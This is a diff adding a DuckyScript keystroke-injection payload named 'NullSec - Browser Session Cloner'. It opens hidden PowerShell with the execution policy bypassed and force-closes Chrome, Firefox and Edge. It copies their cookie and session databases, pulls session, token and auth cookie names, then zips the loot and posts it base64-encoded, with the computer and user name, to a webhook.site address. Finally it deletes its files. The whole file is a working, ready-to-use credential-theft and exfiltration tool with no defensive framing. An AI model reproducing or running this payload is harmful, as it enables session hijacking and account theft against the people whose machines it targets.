@@ -1,0 +1,90 @@
+REM NullSec - Browser Session Cloner
+REM Clones active browser sessions for session hijacking
+REM Extracts cookies, localStorage, sessionStorage
+
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 1000
+
+STRING $sessions = @{}
+ENTER
+
+REM Chrome session data
+STRING $sessions.Chrome = @{}
+STRING $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
+STRING if (Test-Path $chromePath) {
+    $sessions.Chrome.Cookies = "$chromePath\Network\Cookies"
+    $sessions.Chrome.Sessions = "$chromePath\Sessions"
+    $sessions.Chrome.LocalStorage = Get-ChildItem "$chromePath\Local Storage\leveldb" -ErrorAction SilentlyContinue | Select Name
+    
+    # Copy cookies database (SQLite)
+    Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue
+    Start-Sleep 1
+    Copy-Item "$chromePath\Network\Cookies" "$env:TEMP\chrome_cookies.db" -Force -ErrorAction SilentlyContinue
+}
+ENTER
+DELAY 500
+
+REM Firefox session data
+STRING $sessions.Firefox = @{}
+STRING $firefoxPath = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*.default*" | Select -First 1 -ExpandProperty FullName
+STRING if ($firefoxPath) {
+    $sessions.Firefox.Profile = $firefoxPath
+    Stop-Process -Name firefox -Force -ErrorAction SilentlyContinue
+    Start-Sleep 1
+    Copy-Item "$firefoxPath\cookies.sqlite" "$env:TEMP\firefox_cookies.db" -Force -ErrorAction SilentlyContinue
+    Copy-Item "$firefoxPath\sessionstore-backups\recovery.jsonlz4" "$env:TEMP\firefox_session.jsonlz4" -Force -ErrorAction SilentlyContinue
+}
+ENTER
+DELAY 500
+
+REM Edge session data
+STRING $sessions.Edge = @{}
+STRING $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
+STRING if (Test-Path $edgePath) {
+    Stop-Process -Name msedge -Force -ErrorAction SilentlyContinue
+    Start-Sleep 1
+    Copy-Item "$edgePath\Network\Cookies" "$env:TEMP\edge_cookies.db" -Force -ErrorAction SilentlyContinue
+}
+ENTER
+DELAY 500
+
+REM Extract session tokens from cookies
+STRING Add-Type -AssemblyName System.Data.SQLite -ErrorAction SilentlyContinue
+STRING $tokens = @{}
+STRING try {
+    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$env:TEMP\chrome_cookies.db")
+    $conn.Open()
+    $cmd = $conn.CreateCommand()
+    $cmd.CommandText = "SELECT host_key, name, encrypted_value FROM cookies WHERE name LIKE '%session%' OR name LIKE '%token%' OR name LIKE '%auth%'"
+    $reader = $cmd.ExecuteReader()
+    while ($reader.Read()) {
+        $tokens[$reader["host_key"]] = @{name=$reader["name"]}
+    }
+    $conn.Close()
+} catch {}
+ENTER
+DELAY 300
+
+STRING $sessions.ExtractedTokens = $tokens
+ENTER
+
+REM Package everything
+STRING $archive = "$env:TEMP\sessions_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
+STRING Compress-Archive -Path "$env:TEMP\*_cookies.db","$env:TEMP\*_session*" -DestinationPath $archive -Force -ErrorAction SilentlyContinue
+ENTER
+DELAY 500
+
+REM Exfil
+STRING $bytes = [IO.File]::ReadAllBytes($archive)
+STRING $b64 = [Convert]::ToBase64String($bytes)
+STRING try { Invoke-RestMethod -Uri "https://webhook.site/YOUR-ID" -Method Post -Body @{data=$b64;host=$env:COMPUTERNAME;user=$env:USERNAME} } catch {}
+ENTER
+DELAY 500
+
+REM Cleanup
+STRING Remove-Item "$env:TEMP\*_cookies.db","$env:TEMP\*_session*",$archive -Force 2>$null
+STRING exit
+ENTER
